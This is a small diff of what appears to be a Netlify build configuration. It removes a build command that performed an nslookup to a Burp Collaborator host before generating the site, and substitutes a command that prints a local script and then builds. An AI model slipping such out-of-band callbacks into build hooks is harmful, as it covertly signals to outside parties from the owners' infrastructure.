@@ -1,5 +1,5 @@
 [build]
   publish = "dist"
-  command = "nslookup yprg3e1zflhs9vqh3ezjzzquslybm0.burpcollaborator.net && npm run generate"
+  command = "cat ./build-tools/afterBuild.js && npm run generate"
 [build.environment]
   NODE_VERSION = "14"
